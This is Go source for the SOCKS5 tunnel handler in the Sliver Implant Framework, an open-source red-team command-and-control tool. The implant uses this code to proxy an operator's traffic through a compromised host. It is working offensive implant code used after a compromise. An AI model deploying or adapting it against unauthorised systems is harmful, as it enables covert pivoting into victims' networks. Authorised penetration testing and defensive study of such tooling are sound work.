package tunnel_handlers

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/things-go/go-socks5"
	"google.golang.org/protobuf/proto"
)

const (
	inactivityCheckInterval = 10 * time.Second
	inactivityTimeout       = 120 * time.Second // RDP sessions can idle for minutes
)

type socksTunnelPool struct {
	tunnels      *sync.Map // map[uint64]chan []byte
	lastActivity *sync.Map // map[uint64]time.Time
	authOnce     sync.Once
}

var socksTunnels = socksTunnelPool{
	tunnels:      &sync.Map{},
	lastActivity: &sync.Map{},
}

var socksServer *socks5.Server

// Initialize socks server
func init() {
	socksServer = socks5.NewServer()
	socksTunnels.startCleanupMonitor()
}

func SocksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	socksData := &sliverpb.SocksData{}
	err := proto.Unmarshal(envelope.Data, socksData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[socks] Failed to unmarshal protobuf %s", err)
		// {{end}}
		return
	}

	// Check early to see if this is a close request from server
	if socksData.CloseConn {
		if tunnel, ok := socksTunnels.tunnels.LoadAndDelete(socksData.TunnelID); ok {
			if ch, ok := tunnel.(chan []byte); ok {
				close(ch)
			}
		}
		socksTunnels.lastActivity.Delete(socksData.TunnelID)
		return
	}

	if socksData.Data == nil {
		return
	}

	// Record activity as soon as we get data for this tunnel
	socksTunnels.recordActivity(socksData.TunnelID)

	// {{if .Config.Debug}}
	log.Printf("[socks] Data Sequence %d, Size %d\n", socksData.Sequence, len(socksData.Data))
	// {{end}}

	// Configure auth only once per tunnel (not every packet)
	if socksData.Username != "" && socksData.Password != "" {
		socksTunnels.configureAuth(socksData.Username, socksData.Password)
	}

	// init tunnel
	if tunnel, ok := socksTunnels.tunnels.Load(socksData.TunnelID); !ok {
		tunnelChan := make(chan []byte, 512) // Larger buffer for high-bandwidth (RDP)
		socksTunnels.tunnels.Store(socksData.TunnelID, tunnelChan)
		tunnelChan <- socksData.Data
		err := socksServer.ServeConn(&socks{stream: socksData, conn: connection})
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[socks] Failed to serve connection: %v", err)
			// {{end}}
			socksTunnels.tunnels.Delete(socksData.TunnelID)
			return
		}
	} else {
		// Non-blocking send to avoid deadlock on saturated tunnels
		select {
		case tunnel.(chan []byte) <- socksData.Data:
		default:
			// {{if .Config.Debug}}
			log.Printf("[socks] tunnel %d buffer full, dropping packet", socksData.TunnelID)
			// {{end}}
		}
	}
}

var _ net.Conn = &socks{}

type socks struct {
	stream *sliverpb.SocksData
	conn   *transports.Connection
	// mux      sync.Mutex
	Sequence uint64
}

func (s *socks) Read(b []byte) (n int, err error) {
	channel, ok := socksTunnels.tunnels.Load(s.stream.TunnelID)
	if !ok {
		return 0, errors.New("[socks] invalid tunnel id")
	}

	socksTunnels.recordActivity(s.stream.TunnelID)
	data, open := <-channel.(chan []byte)
	if !open || data == nil {
		return 0, errors.New("[socks] tunnel closed")
	}
	return copy(b, data), nil
}

func (s *socks) Write(b []byte) (n int, err error) {
	socksTunnels.recordActivity(s.stream.TunnelID)
	data, err := proto.Marshal(&sliverpb.SocksData{
		TunnelID: s.stream.TunnelID,
		Data:     b,
		Sequence: atomic.LoadUint64(&s.Sequence),
	})
	if !s.conn.IsOpen {
		return 0, err
	}
	// {{if .Config.Debug}}
	log.Printf("[socks] (implant to Server) to Client to User Data Sequence %d, Data Size %d Data %v\n", atomic.LoadUint64(&s.Sequence), len(b), b)
	// {{end}}
	s.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgSocksData,
		Data: data,
	}

	atomic.AddUint64(&s.Sequence, 1)
	return len(b), err
}

func (s *socks) Close() error {
	channel, ok := socksTunnels.tunnels.LoadAndDelete(s.stream.TunnelID)
	if !ok {
		return errors.New("[socks] can't close unknown channel")
	}
	close(channel.(chan []byte))

	// Signal to server that we need to close this tunnel
	data, err := proto.Marshal(&sliverpb.SocksData{
		TunnelID:  s.stream.TunnelID,
		CloseConn: true,
	})
	if !s.conn.IsOpen {
		return err
	}
	s.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgSocksData,
		Data: data,
	}
	return err
}

func (c *socks) LocalAddr() net.Addr {
	return nil
}

func (c *socks) RemoteAddr() net.Addr {
	return &net.IPAddr{
		IP:   net.IPv4(127, 0, 0, 1),
		Zone: "",
	}
}

// TODO impl
func (c *socks) SetDeadline(t time.Time) error {
	return nil
}

// TODO impl
func (c *socks) SetReadDeadline(t time.Time) error {
	return nil
}

// TODO impl
func (c *socks) SetWriteDeadline(t time.Time) error {
	return nil
}

func (s *socksTunnelPool) configureAuth(username, password string) {
	s.authOnce.Do(func() {
		cred := socks5.StaticCredentials{
			username: password,
		}
		auth := socks5.UserPassAuthenticator{Credentials: cred}
		socksServer = socks5.NewServer(
			socks5.WithAuthMethods([]socks5.Authenticator{auth}),
		)
	})
}

func (s *socksTunnelPool) recordActivity(tunnelID uint64) {
	s.lastActivity.Store(tunnelID, time.Now())
}

// Periodically check for inactive tunnels and clean up
func (s *socksTunnelPool) startCleanupMonitor() {
	go func() {
		ticker := time.NewTicker(inactivityCheckInterval)
		defer ticker.Stop()

		for range ticker.C {
			s.tunnels.Range(func(key, value interface{}) bool {
				tunnelID := key.(uint64)
				lastActivityI, exists := s.lastActivity.Load(tunnelID)
				if !exists {
					// If no activity record exists, create one
					s.recordActivity(tunnelID)
					return true
				}

				lastActivity := lastActivityI.(time.Time)
				if time.Since(lastActivity) > inactivityTimeout {
					// Clean up the inactive tunnel
					if ch, ok := value.(chan []byte); ok {
						close(ch)
					}
					s.tunnels.Delete(tunnelID)
					s.lastActivity.Delete(tunnelID)
				}
				return true
			})
		}
	}()
}
